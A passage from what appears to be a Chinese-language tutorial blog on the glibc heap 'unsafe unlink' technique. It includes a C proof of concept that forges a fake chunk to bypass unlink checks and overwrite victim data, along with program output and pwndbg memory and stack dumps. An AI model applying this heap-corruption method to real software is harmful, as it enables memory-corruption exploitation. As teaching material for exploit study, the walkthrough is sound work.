class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *chunk1, *chunk2;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *fake_chunk, *chunk2_hdr;<br>  <span class="hljs-type">char</span> data[<span class="hljs-number">20</span>];<br> <br>  <span class="hljs-comment">// First grab two chunks (non fast)</span><br>  chunk1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>  chunk2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk1_addr : %p\n&quot;</span>, &amp;chunk1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk2_addr : %p\n&quot;</span>,&amp;chunk2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] chunk1 : %p\n&quot;</span>, chunk1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk2 : %p\n&quot;</span>, chunk2);<br> <br>  <span class="hljs-comment">// Assuming attacker has control over chunk1&#x27;s contents</span><br>  <span class="hljs-comment">// Overflow the heap, override chunk2&#x27;s header</span><br> <br>  <span class="hljs-comment">// First forge a fake chunk starting at chunk1</span><br>  <span class="hljs-comment">// Need to setup fd and bk pointers to pass the unlink security check</span><br>  fake_chunk = (<span class="hljs-keyword">struct</span> chunk_structure *)chunk1;<br>  fake_chunk-&gt;fd = (<span class="hljs-keyword">struct</span> chunk_structure *)(&amp;chunk1 - <span class="hljs-number">3</span>); <span class="hljs-comment">// Ensures P-&gt;fd-&gt;bk == P</span><br>  fake_chunk-&gt;bk = (<span class="hljs-keyword">struct</span> chunk_structure *)(&amp;chunk1 - <span class="hljs-number">2</span>); <span class="hljs-comment">// Ensures P-&gt;bk-&gt;fd == P</span><br> <br>  <span class="hljs-comment">// Next modify the header of chunk2 to pass all security checks</span><br>  chunk2_hdr = (<span class="hljs-keyword">struct</span> chunk_structure *)(chunk2 - <span class="hljs-number">2</span>);<br>  chunk2_hdr-&gt;prev_size = <span class="hljs-number">0x80</span>;  <span class="hljs-comment">// chunk1&#x27;s data region size</span><br>  chunk2_hdr-&gt;size &amp;= ~<span class="hljs-number">1</span>;        <span class="hljs-comment">// Unsetting prev_in_use bit</span><br> <br>  <span class="hljs-comment">// Now, when chunk2 is freed, attacker&#x27;s fake chunk is &#x27;unlinked&#x27;</span><br>  <span class="hljs-comment">// This results in chunk1 pointer pointing to chunk1 - 3</span><br>  <span class="hljs-comment">// i.e. chunk1[3] now contains chunk1 itself.</span><br>  <span class="hljs-comment">// We then make chunk1 point to some victim&#x27;s data</span><br>  <span class="hljs-built_in">free</span>(chunk2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk1 :%p\n&quot;</span>, chunk1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk1[3] : %x\n&quot;</span>, chunk1[<span class="hljs-number">3</span>]);<br> <br>  chunk1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>)data;<br> <br>  <span class="hljs-built_in">strcpy</span>(data, <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span>);<br> <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,data);<br>  <span class="hljs-comment">// Overwrite victim&#x27;s data using chunk1</span><br>  chunk1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x002164656b636168LL</span>;<br> <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, data);<br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><p>我们先运行一下程序看看程序的输出:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[*]</span>chunk1_addr : 0x7fffa0b55ff0<br><span class="hljs-comment">[*]</span>chunk2_addr : 0x7fffa0b55ff8<br><span class="hljs-comment">[*]</span>chunk1 : 0xb3a010<br><span class="hljs-comment">[*]</span>chunk2 : 0xb3a0a0<br><span class="hljs-comment">[*]</span>chunk1 :0x7fffa0b55fd8<br><span class="hljs-comment">[*]</span>chunk1<span class="hljs-comment">[3]</span> : a0b55fd8<br>hacked!<br><br></code></pre></td></tr></table></figure><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>代码逻辑很简单,程序先是创建了一个模拟<code>free chunk</code>的结构体,然后创建了两个<code>unsigned long long</code> 的chunk,分配了两个0x80的内存.<br>之后进行了三次输出,分别输出了chunk1的地址和chunk1,chunk2的内容<br>随后进行了类型强转,这时我们就有了一个模拟<code>free chunk</code>的fake chunk,并且chunk1我们还可以进行利用,意味着我们有了一个uaf的chunk即chunk1.<br>我们知道,chunk的指针给的是指向mem地址的,因此它后续的一些操作</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">fake_chunk = (struct chunk_structure *)chunk1;<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span> = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk == P<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd == P<br></code></pre></td></tr></table></figure><h2 id="小实例"><a href="#小实例" class="headerlink" title="小实例"></a>小实例</h2><p>在这里便于理解我写了一个小的demo来解释一些指针的加减,代码如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> *chunk1,*chunk2;<br>        chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        chunk1=<span class="hljs-number">100</span>;<br>        chunk2=<span class="hljs-number">200</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-3</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-2</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-3</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-2</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译运行一下:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;╰─<span class="hljs-meta"># ./test</span><br><span class="hljs-number">0x7ffdd51db3f8</span><br><span class="hljs-number">0x64</span><br><span class="hljs-number">0x7ffdd51db400</span><br><span class="hljs-number">0xc8</span><br><span class="hljs-number">0x4c</span><br><span class="hljs-number">0x54</span><br><span class="hljs-number">0x5c</span><br><span class="hljs-number">0x7ffdd51db3e0</span> <span class="hljs-comment">//chunk1-3</span><br><span class="hljs-number">0x7ffdd51db3e8</span> <span class="hljs-comment">//chunk1-2</span><br><span class="hljs-number">0x7ffdd51db3f0</span> <span class="hljs-comment">//chunk1-1</span><br></code></pre></td></tr></table></figure><p>可以看到每次指针在做减法运算时地址其实每次减8,即</p><p><strong>&amp;str -1&#x3D;str_addr - 8</strong></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这时我们再来看看结构体</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> &#123;<br>  <span class="hljs-type">size_t</span> prev_size;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *fd;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *bk;   <br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>];               <span class="hljs-comment">// padding</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>我们知道正常chunk的指针是指向mem的,因此我们的chunk_structure就是指向mem的也就是chunk1的地址,我们调试一下.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-number">0x00000000004006cc</span> &lt;+<span class="hljs-number">102</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x40089e</span><br>   <span class="hljs-number">0x00000000004006d1</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x00000000004006d6</span> &lt;+<span class="hljs-number">112</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400530</span> &lt;printf@plt&gt;<br>   <span class="hljs-number">0x00000000004006db</span> &lt;+<span class="hljs-number">117</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x38</span>]<br>   <span class="hljs-number">0x00000000004006df</span> &lt;+<span class="hljs-number">121</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x00000000004006e2</span> &lt;+<span class="hljs-number">124</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x4008ae</span><br>   <span class="hljs-number">0x00000000004006e7</span> &lt;+<span class="hljs-number">129</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x00000000004006ec</span> &lt;+<span class="hljs-number">134</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400530</span> &lt;printf@plt&gt;<br>   <span class="hljs-number">0x00000000004006f1</span> &lt;+<span class="hljs-number">139</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>]<br>   <span class="hljs-number">0x00000000004006f5</span> &lt;+<span class="hljs-number">143</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x30</span>],<span class="hljs-built_in">rax</span><br>=&gt; <span class="hljs-number">0x00000000004006f9</span> &lt;+<span class="hljs-number">147</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>]<br></code></pre></td></tr></table></figure><p>我在main_139行处下了断点,也就是第一次强转的地方,然后让第一次强转结束,这时看一下内存:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; p/x chunk1<br>$<span class="hljs-number">6</span> = <span class="hljs-number">0x602010</span><br>pwndbg&gt; p/x fake_chunk<br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602010</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602050</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602010</span>-<span class="hljs-number">16</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000091</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>可以看到chunk_size是0x91,因为我们申请了0x80的内存,加上前面的16字节,然后和16位对齐,加一位标志位就刚刚好是0x91,此时的fake_chunk</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">22</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们把后两步对于fd指针和bk指针的操作走完,再看一下内存</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000091</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00007fffffffe5d8      <span class="hljs-number">0</span>x00007fffffffe5e0<br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>此时的fake_chunk:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">24</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7fffffffe5d8,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7fffffffe5e0,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们看一下fd指针和bk指针的指向内存:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x7fffffffe5d8<br><span class="hljs-attribute">0x7fffffffe5d8</span>: <span class="hljs-number">0</span>x00007ffff7ffe168      <span class="hljs-number">0</span>x0000000000000003<br><span class="hljs-attribute">0x7fffffffe5e8</span>: <span class="hljs-number">0</span>x00000000004006f1      <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7fffffffe5f8</span>: <span class="hljs-number">0</span>x00000000006020a0      <span class="hljs-number">0</span>x0000000000602010<br><span class="hljs-attribute">0x7fffffffe608</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00000000004007f0<br><span class="hljs-attribute">0x7fffffffe618</span>: <span class="hljs-number">0</span>x0000000000400570      <span class="hljs-number">0</span>x00007fffffffe710<br><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x7fffffffe5e0<br><span class="hljs-attribute">0x7fffffffe5e0</span>: <span class="hljs-number">0</span>x0000000000000003      <span class="hljs-number">0</span>x00000000004006f1<br><span class="hljs-attribute">0x7fffffffe5f0</span>: <span class="hljs-number">0</span>x0000000000602010      <span class="hljs-number">0</span>x00000000006020a0<br><span class="hljs-attribute">0x7fffffffe600</span>: <span class="hljs-number">0</span>x0000000000602010      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7fffffffe610</span>: <span class="hljs-number">0</span>x00000000004007f0      <span class="hljs-number">0</span>x0000000000400570<br><span class="hljs-attribute">0x7fffffffe620</span>: <span class="hljs-number">0</span>x00007fffffffe710      <span class="hljs-number">0</span>xd26463308dde9200<br></code></pre></td></tr></table></figure><p>此时的fake_chunk_fd:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">26</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">140737354129768</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x4006f1 <span class="hljs-operator">&lt;</span>main<span class="hljs-operator">+</span><span class="hljs-number">139</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x602010,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\2</span>40 `<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>20 &quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>fake_chunk-&gt;bk:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">$<span class="hljs-number">27</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">4196081</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x602010,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x6020a0,<br>  <span class="hljs-attr">buf</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\0</span>20 `<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00<span class="hljs-char escape_">\0</span>00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时fake_chunk-&gt;fd-&gt;bk&#x3D;chunk1<br>    fake_chunk-&gt;bk-&gt;fd&#x3D;chunk1<br>成功绕过指针指向检测<br>这里我们重新看看之前都做了什么操作</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">fake_chunk = (struct chunk_structure *)chunk1;<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span> = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk == P<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd == P<br></code></pre></td></tr></table></figure><p>先让fake_chunk指向chunk1,然后把fake_chunk的fd指向chunk1-3的位置,这个位置正好能让fake_chunk-&gt;fd-&gt;bk&#x3D;fake_chunk(chunk1),第三号同理,这时我们就成功通过了unlink的检测.</p><p>然后我们就需要看size的检测了,这是现在栈里的布局</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; stack <span class="hljs-number">10</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0</span>x7fffffffe5f0 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x6020a0 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0</span>x7fffffffe600 —▸ <span class="hljs-number">0</span>x602010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0</span>x7fffffffe608 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">04</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0</span>x7fffffffe610 —▸ <span class="hljs-number">0</span>x4007f0 (__libc_csu_init) ◂— push   r15<br><span class="hljs-attribute">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0</span>x7fffffffe618 —▸ <span class="hljs-number">0</span>x400570 (_start) ◂— xor    ebp, ebp<br><span class="hljs-attribute">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0</span>x7fffffffe620 —▸ <span class="hljs-number">0</span>x7fffffffe710 ◂— <span class="hljs-number">0</span>x1<br><span class="hljs-attribute">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0</span>x7fffffffe628 ◂— <span class="hljs-number">0</span>xd26463308dde9200<br><span class="hljs-attribute">08</span>:<span class="hljs-number">0040</span>│ rbp  <span class="hljs-number">0</span>x7fffffffe630 —▸ <span class="hljs-number">0</span>x4007f0 (__libc_csu_init) ◂— push   r15<br><span class="hljs-attribute">09</span>:<span class="hljs-number">0048</span>│      <span class="hljs-number">0</span>x7fffffffe638 —▸ <span class="hljs-number">0</span>x7ffff7a2d830 (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br></code></pre></td></tr></table></figure><p>后面要进行的操作是这样的:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 